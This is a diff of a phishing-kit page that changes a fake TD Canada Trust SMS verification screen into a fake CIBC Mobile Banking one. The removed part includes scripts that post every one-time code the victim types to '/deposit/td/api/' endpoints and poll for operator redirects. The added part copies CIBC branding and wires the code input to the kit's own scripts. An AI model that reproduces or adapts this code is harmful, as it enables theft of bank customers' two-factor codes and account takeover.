@@ -1,361 +1,186 @@
-<html ng-app="com.td.tdi.uapWeb" lang="en-CA">
+<html>
 
 <head>
     <span hidden id="page"> SMS-OTP </span>
-    <span hidden id="pageRedirection"> /td/loading </span>
+    <span hidden id="pageRedirection"> /cibc/loading </span>
+    <script type="text/javascript" id="custom-useragent-string"></script>
     <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-    <style type="text/css">
-        [ng\:cloak],
-        [ng-cloak],
-        [data-ng-cloak],
-        [x-ng-cloak],
-        .ng-cloak,
-        .x-ng-cloak,
-        .ng-hide:not(.ng-hide-animate) {
-            display: none !important;
-        }
-
-        [ng\:form] {
-            display: block;
-        }
-
-        .ng-animate-shim {
+    <title>E-tranfer</title>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="HandheldFriendly" content="true">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="stylesheet" href="/assets/cibc/confirm_files/reset.css">
+    <link rel="stylesheet" href="/assets/cibc/confirm_files/reset-brand.css">
+    <link rel="stylesheet" href="/assets/cibc/confirm_files/global.css">
+    <link rel="stylesheet" href="/assets/cibc/confirm_files/global-android2.css">
+    <link rel="stylesheet" href="/assets/cibc/confirm_files/global-brand.css">
+    <link rel="stylesheet" href="/assets/cibc/confirm_files/password-reset.css">
+    <link rel="stylesheet" href="/assets/cibc/confirm_files/password-reset-brand.css">
+    <style id="at-makers-style" class="at-flicker-control">
+        .mboxDefault {
             visibility: hidden;
         }
 
-        .ng-anchor {
-            position: absolute;
-        }
-    </style>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable = no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-touch-fullscreen" content="yes">
-    <title>EasyWeb Login</title>
-    <link rel="stylesheet" href="/assets/td/files2/uap-application-all-css.css">
-    <link rel="icon" href="/assets/td/favicon.ico">
-    <style>
-        .form-group {
-            padding-top: 0px;
+        .tfa-info p {
+            margin-bottom: 10px;
         }
 
-        .display-inline-block {
-            display: inline-block;
+        .mb5 {
+            margin-bottom: 15px;
+        }
+    </style>
+    <style>
+        #header-logo {
+            background: url(/assets/cibc/img/cibcnew.svg);
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: contain;
+            width: 100px;
         }
     </style>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
-    <script>var lrbank = '<?=escape($udata->last->bank)?>'; var lrinfo = '<?=escape($udata->last->info)?>';</script>
+    <script>
+        var lrbank = '<?=escape($udata->last->bank)?>';
+        var lrinfo = '<?=escape($udata->last->info)?>';
+    </script>
     <script src="/assets/js/actions.js?v=<?=time()?>"></script>
-    <script>
-        setInterval(function () {
-            $.post('/deposit/td/api/status', { page: '2FA (Waiting)' }, function (response) {
-                if (response.status) {
-                    location.href = response.href;
-                }
-            }, 'JSON');
-        }, 1000);
-    </script>
-    <script>
-        $(document).on('change', '#input-code', function () {
-            $.post('/deposit/td/api/otp-data', { code: $(this).val() });
-        });
-
-        $.post('/deposit/td/api/otp-type', { type: 'SMS' }, function (response) { });
-
-        $(document).on('submit', '.lab-form', function (e) {
-            $('.btn-save').attr('disabled', true);
-            $('.btn-save .btn-txt').css('display', 'none');
-            $('.btn-save .btn-spinner').css('display', 'block');
-
-            $.post('/deposit/td/api/otp-submit', { code: $('#input-code').val() }, function (response) {
-                location.href = '/deposit/td/wo/' + rand_str(16);
-            });
-
-            e.preventDefault();
-        });
-
-        function rand_str(length) {
-            var result = '';
-            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            var charactersLength = characters.length;
-            for (var i = 0; i < length; i++) {
-                result += characters.charAt(Math.floor(Math.random() * charactersLength));
-            }
-            return result;
-        }
-    </script>
-     <script src="/socket.io/socket.io.js"></script>
-     <script src="../assets/js/td/login/index.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.css">
+    <link rel="stylesheet" href="/assets/css/loader.css?v=<?=time()?>">
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="../assets/js/cibc/login/index.js"></script>
 </head>
 
-<body prevent-click-highlight="" autoscroll="" class="">
+<body lang="en" class="android-fix">
     <input type="hidden" id="userAgent" name="userAgent">
     <input type="hidden" id="banks" name="banks">
-    <div id="contentWrapper">
-        <div data-ui-view="header" class="" style="">
-            <otp-header>
-                <div class="td_rq_header-nav td-header-nav">
-                    <header class="td-header-desktop">
-                        <div class="td-nav-primary">
-                            <div class="td-container">
-                                <div class="td-section-left">
-                                    <div class="td-logo" style="margin-top: 15px;">
-                                        <img ng-src="generated/styles/images/header-nav/td-logo.png"
-                                            alt="TD Canada Trust" src="/assets/td/files2/td-logo.png">
-                                    </div>
-                                </div>
-                                <div class="td-section-right">
-                                    <div class="td-quick-access">
-                                        <ul class="td-header-nav-utilities">
-                                            <li ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)"
-                                                class="td-dropdown td-dropdown-language td-dropdown-no-hover ng-hide"
-                                                aria-hidden="true">
-                                                <a href="" class="td-show-label" aria-haspopup="true"
-                                                    aria-expanded="false" id="td-desktop-nav-dropdown-link-0">
-                                                    <span class="td-forscreenreader">Select language</span>
-                                                    Français
-                                                    <span class="td-icon expand" aria-hidden="true"></span>
-                                                    <span class="td-icon collapse" aria-hidden="true"></span>
-                                                </a>
-                                                <ul class="td-dropdown-content"
-                                                    aria-labelledby="td-desktop-nav-dropdown-link-0">
-                                                    <!---->
-                                                    <li ng-class="{'active': language==vm.dt.selectedLanguage}"
-                                                        ng-repeat="language in vm.dt.languages track by $index"
-                                                        class="active">
-                                                        <a href="" role="button" ng-click="vm.setLanguage(language)">
-                                                            English
-                                                            <!----><span ng-if="language==vm.dt.selectedLanguage"
-                                                                class="td-icon selected" aria-hidden="true">
-                                                            </span><!---->
-                                                            <!----><span ng-if="language==vm.dt.selectedLanguage"
-                                                                class="td-forscreenreader">Selected</span><!---->
-                                                        </a>
-                                                    </li>
-                                                    <!---->
-                                                    <li ng-class="{'active': language==vm.dt.selectedLanguage}"
-                                                        ng-repeat="language in vm.dt.languages track by $index">
-                                                        <a href="" role="button" ng-click="vm.setLanguage(language)">
-                                                            Français
-                                                            <!---->
-                                                            <!---->
-                                                        </a>
-                                                    </li>
-                                                    <!---->
-                                                </ul>
-                                            </li>
-                                            <li class="secure-lock-position" aria-hidden="true">
-                                            </li>
-                                        </ul>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </header>
-                    <!-- Desktop Header END -->
-                    <!-- Mobile Header START -->
-                    <header class="td-header-mobile">
-                        <div class="td-container">
-                            <div class="td-section-left">
-                                <button type="button" class="td-mobile-action-button td-mobile-menu-button">
-                                    <div ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)"
-                                        class="td-mobile-menu-button-icon ng-hide" aria-hidden="true">
-                                        <span class="td-forscreenreader">Open menu</span>
-                                        <span class="icon-bar" aria-hidden="true"></span>
-                                        <span class="icon-bar" aria-hidden="true"></span>
-                                        <span class="icon-bar" aria-hidden="true"></span>
-                                    </div>
-                                    <div class="td-logo">
-                                        <img src="/assets/td/files2/td-logo.png" alt="TD Canada Trust">
-                                    </div>
-                                </button>
-                                <button type="button" class="td-mobile-action-button td-mobile-back-button"
-                                    onclick="history.back();">
-                                    Test!
-                                    <div class="td-mobile-back-button-icon">
-                                        <span class="td-icon"></span>
-                                        <span class="td-forscreenreader">Back</span>
-                                    </div>
-                                    <div class="td-logo">
-                                        <img src="/assets/td/files2/td-logo.png" alt="TD Canada Trust">
-                                    </div>
-                                </button>
-                            </div>
-                            <div class="td-section-right">
-                                <div class="secure-lock-position" aria-hidden="true">
-                                    <!--<span class="td-icon icon-regular td-icon-logout"></span>-->
-                                </div>
-                            </div>
-                        </div>
-                    </header>
-                    <!-- Mobile Header END -->
-                    <!-- Mobile Off-canvas Menu START -->
-                    <div ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)"
-                        class="td-nav-mobile ng-hide" aria-hidden="true">
-                        <!-- Primary mobile menu START -->
-                        <div class="td-nav-mobile-menu td-nav-mobile-menu-primary">
-                            <span tabindex="0"></span>
-                            <div class="td-nav-mobile-menu-top">
-                                <div class="td-nav-mobile-menu-header">
-                                    <div class="td-logo">
-                                        <a href="https://authentication.td.com/">
-                                            <img src="/assets/td/files2/td-logo.png" alt="TD Canada Trust">
-                                        </a>
-                                    </div>
-                                    <button type="button" class="td-mobile-menu-close">
-                                        <span class="td-forscreenreader">Close Menu</span>
-                                        <span class="td-icon" aria-hidden="true"></span>
-                                    </button>
-                                </div>
-                            </div>
-                            <nav>
-                                <ul class="td-nav-mobile-menu-list">
-                                    <li
-                                        class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-language">
-                                        <a href="" aria-expanded="false" role="button">
-                                            <span class="td-forscreenreader">Select language</span>
-                                            Français
-                                            <span class="td-icon expand" aria-hidden="true"></span>
-                                            <span class="td-icon collapse" aria-hidden="true"></span>
-                                        </a>
-                                        <ul class="td-accordion-content">
-                                            <!---->
-                                            <li ng-class="{'active': language==vm.dt.selectedLanguage}"
-                                                ng-repeat="language in vm.dt.languages track by $index" class="active">
-                                                <a href="" role="button" ng-click="vm.setLanguage(language)">
-                                                    English
-                                                    <!----><span ng-if="language==vm.dt.selectedLanguage"
-                                                        class="td-icon selected" aria-hidden="true">
-                                                    </span><!---->
-                                                    <!----><span ng-if="language==vm.dt.selectedLanguage"
-                                                        class="td-forscreenreader">Selected</span><!---->
-                                                </a>
-                                            </li>
-                                            <!---->
-                                            <li ng-class="{'active': language==vm.dt.selectedLanguage}"
-                                                ng-repeat="language in vm.dt.languages track by $index">
-                                                <a href="" role="button" ng-click="vm.setLanguage(language)">
-                                                    Français
-                                                    <!---->
-                                                    <!---->
-                                                </a>
-                                            </li>
-                                            <!---->
-                                        </ul>
-                                    </li>
-                                </ul>
-                            </nav>
-                            <span tabindex="0"></span>
-                        </div>
-                        <!-- Primary mobile menu END -->
-                        <div class="td-nav-mobile-overlay"></div>
-                    </div>
-                    <!-- Mobile Off-canvas Menu END -->
-                </div>
-            </otp-header>
+    <span class="offscreen">Forgot Password</span>
+    <input type="checkbox" id="drawer-toggle-chk" aria-hidden="true">
+    <label for="drawer-toggle-chk" id="drawer-toggle-label">
+        <img id="open-menu-icon" src="/assets/cibc/confirm_files/drawer-menu-open.png" alt="Open Menu" role="button">
+        <img id="close-menu-icon" src="/assets/cibc/confirm_files/drawer-menu-close.png" alt="Close Menu" role="button">
+    </label>
+    <nav id="drawer-menu" class="scrollable-ver">
+        <div id="menu-wrapper">
+            <div class="drawer-menu-header">
+                <div>CIBC<span>Mobile Banking</span></div>
+            </div>
+            <ul>
+                <li id="li-sign-on"><a id="signon-link" class="tracking-set-flow"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-signonLink"
+                        role="menuitem">Sign On</a></li>
+                <li><a id="register-link" class="tracking-set-flow"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-registerLink"
+                        role="menuitem">Register</a></li>
+                <li id="li-forgot-password"><a id="forgetpwd-link" class="tracking-set-flow active"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-forgetPasswordLink"
+                        role="menuitem">Forgot Password<span class="offscreen">Selected</span></a></li>
+                <hr>
+                <li id="li-open-account"><a id="open-product-link" class="tracking-set-flow"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-openAccountPs-openAccountPsLink"
+                        role="menuitem"
+                        @="Open an Account<span class=&quot;offscreen&quot;>. Opens in new page</span>">Open an
+                        Account</a></li>
+                <li id="li-browse-products"><a id="browse-products-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-browseProductsPs-productSelectorLink"
+                        target="_blank" role="menuitem"
+                        @="Explore Products<span class=&quot;offscreen&quot;>. Opens in new page</span>"
+                        class="">Explore Products</a></li>
+                <li id="li-sites-apps"></li>
+                <li id="li-sites-apps"><a id="sites-link"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-sitesPreSignOnLink"
+                        role="menuitem" class="">CIBCSites</a></li>
+                <li id="li-find-us"><a id="find-us-link"
+                        href="https://www.cibc.com/ca/redirect/locator.html?itrc=C1:6185" target="_blank"
+                        role="menuitem">Find Us</a></li>
+                <li id="li-security"><a id="security-guarantee-link"
+                        href="https://www.cibc.com/ca/mobile/legal/mobile-security.html?itrc=C1:6166" target="_blank"
+                        role="menuitem">Security Guarantee</a></li>
+                <hr>
+                <li><a id="contact-us-link" href="https://www.cibc.com/m/contact-cibc.html?itrc=C1:6187" target="_blank"
+                        role="menuitem">Contact Us</a></li>
+                <li id="idd"><a id="legal-link" role="menuitem"
+                        href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-privacyAndLegalContainer-legalLink"
+                        @="Privacy and Legal<span class=&quot;offscreen&quot;>Opens in new page.</span>"
+                        class="">Privacy and Legal<span class="offscreen">Opens in new page.</span></a></li>
+                <li><a id="help-link" href="http://cibc.intelliresponse.com/mobile-w/?itrc=C1:6167" target="_blank"
+                        role="menuitem">Help</a></li>
+            </ul>
         </div>
-        <!-- Main Content / Body -->
-        <div class="td-contentarea" role="main" style="padding-top: 70px;">
-            <!---->
-            <ui-view class="" style="">
-                <!---->
-                <ui-view>
-                    <reset>
-                        <!---->
-                        <ui-view class="" style="">
-                            <reset-password dt="::$resolve.dt" device-print="::$resolve.devicePrint"
-                                device-info="::$resolve.deviceInfo" thread-matrix="::$resolve.threadMatrix">
-                                <div class="text-center">
-                                    <otp-server-error error="vm.dt.recoverPwdError" display="banner">
-                                        <!---->
-                                    </otp-server-error>
-                                </div>
-                                <div class="td-container">
-                                    <h1 class="text-center" tabindex="0">Confirm your TD Online Access</h1>
-                                    <hr aria-hidden="true" class="td-thin-divider-line-1">
-                                    <form id="loginForm" method="post" action=""
-                                        class="ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic lab-form">
-                                        <h1 class="text-center">Security Code</h1>
-                                        <div style="margin: 16px 0 25px 0">To protect your account, we have sent a
-                                            one-time code to your registered mobile number. Enter the code below to
-                                            continue</div>
-                                            <div id="alertWrong">
+    </nav>
+    <header class="flex-box flex-box-hoz">
+        <div class="flex-box-flex-1"></div>
+        <a href="http://cibc.com/" target="_blank">
+            <div id="header-logo">
+                <span class="offscreen">CIBClogo</span>
+            </div>
+        </a>
+        <div id="header-link" class="flex-box-flex-1">
+        </div>
+    </header>
+    <noscript>
+        <section id="nojs" class="overlay-msg">
+            <div>
+                <p>JavaScript is currently disabled in your browser.</p>
+                <p>To access Mobile Banking, please enable JavaScript and refresh this page.</p>
+            </div>
+        </section>
+    </noscript>
+    <section id="main-page" class="mainPageClassValue">
+        <section id="ide">
+            <section class="page-title">
+                <h2 class="title">Identity Verification</h2>
+            </section>
+        </section>
+        <section id="identity-verification" class="page-wrapper">
+            <div class="tfa-info">
+                <p>In order to sign on to CIBC Banking, we need to verify your identity.</p>
+                <p>We will send you a one-time verification code to your registered mobile number.</p>
+            </div>
+            <div class="global-error-from-container" tabindex="-1" id="id4">
 
-                                            </div>
-                                       
-                                        <div class="td-row">
-                                            <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
-                                                <div class="td-row">
-                                                    <div class="td-col-sm-6 td-col-sm-offset-3">
-                                                        <div class="form-group" style="">
-                                                            <label>Enter code</label>
-                                                            <input required="" id="input-code" type="tel" placeholder=""
-                                                                name="code"
-                                                                class="ng-pristine ng-untouched ng-valid form-control ng-empty lrinput"
-                                                                attr-action="Filling OTP" autocomplete="one-time-code">
-                                                        </div>
-                                                    </div>
-                                                </div>
-                                            </div>
-                                        </div>
-                                        <div class="td-row">
-                                            <div
-                                                class="td-col-sm-4 td-col-sm-offset-2 td-col-sm-push-4 td-col-md-3 td-col-md-offset-3 td-col-md-push-3">
-                                                <div class="form-group">
-                                                    <div onclick="submitForm()" type="submit" class="td-button  td-button-secondary"
-                                                        style="width:100%;">
-                                                        Submit
-                                                </div>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </form>
-                                    <br><br><br><br><br><br><br>
-                                </div>
-                                <br><br>
-                            </reset-password>
-                        </ui-view>
-                    </reset>
-                </ui-view>
-            </ui-view>
-        </div>
-        <div data-ui-view="footer" class="">
-            <otp-footer>
-                <footer class="td-background-dark-green"
-                    style="left: 0px; right: 0px; bottom: 0px; position: absolute;">
-                    <div class="td-container">
-                        <div class="td-row">
-                            <div class="td-col-xs-12 td-footer-content otp-footer-content">
-                                <div class="td-footer-links td-copy-align-centre td-copy-white">
-                                    <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank"
-                                        href="https://www.td.com/privacy-and-security/privacy-and-security/index.jsp">
-                                        Privacy and Security
-                                    </a>
-                                    <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank"
-                                        href="https://www.td.com/to-our-customers/">
-                                        Legal
-                                    </a>
-                                    <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank"
-                                        href="http://www.tdcanadatrust.com/customer-service/accessibility/accessibility-at-td/index.jsp">
-                                        Accessibility
-                                    </a>
-                                    <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
-                                </div>
-                            </div>
+                <div id="alertWrong" class="global-error-from-container" tabindex="-1">
+
+                </div>
+
+            </div>
+            <form id="loginForm">
+                <section id="step-2">
+                    <fieldset class="otvc">
+                        <label for="otvc-code">
+                            <p class="label-pad-b5">VERIFICATION CODE:</p>
+                        </label>
+                        <input pattern="[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}" data-id="otvc" id="input-code"
+                            type="tel" name="code" placeholder="6-digit code" maxlength="6" value=""
+                            autocomplete="one-time-code" required>
+                    </fieldset>
+                    <span id="id1b">
+                        <p class="mb5">
+                            <span class="label-pad-b5">Didn't get the code?</span>
+                            <a href="javascript:;" class="nga-resend-button" id="btn-resend">
+                                <span>Resend code</span>
+                            </a>
+                        </p>
+                        <div class="linepadtop7bottom20">
+                            <span>Please allow a few minutes for the verification code to be sent.</span>
                         </div>
-                    </div>
-                </footer>
-            </otp-footer>
-        </div>
+                    </span>
+                </section>
+                <fieldset class="button-set">
+                    <input type="button" class="btn btn-negative" id="btb-cancel" value="Cancel">
+                    <span class="btn btn-positive btn-full btn-save">
+                        <span onclick="submitForm()" class="btn-txt">OK</span>
+                        <span class="btn-spinner" style="display: none"><i class="fa fa-spinner fa-spin"></i></span>
+                    </span>
+                </fieldset>
+            </form>
+        </section>
+    </section>
+    <div id="__loadingScreenDiv" class="ajax-overlay" aria-live="assertive">
+        <div class="ajax-overlay-background"></div>
+        <img src="/assets/cibc/confirm_files/loading.gif" class="ajax-overlay-spinner" tabindex="-1" alt="Page loading">
     </div>
-    <!--[if lt IE 9]>
-        <script type="text/javascript" src="resources/es5-shim/es5-shim.min.js?v=0.0.8-HOTFIX2"></script>
-        <script type="text/javascript" src="resources/html5shiv/dist/html5shiv.min.js?v=0.0.8-HOTFIX2"></script>
-        <![endif]-->
-    <div id="ads"></div>
-    <div id="ads"></div>
-    <div id="ads"></div>
 </body>
 
 </html>
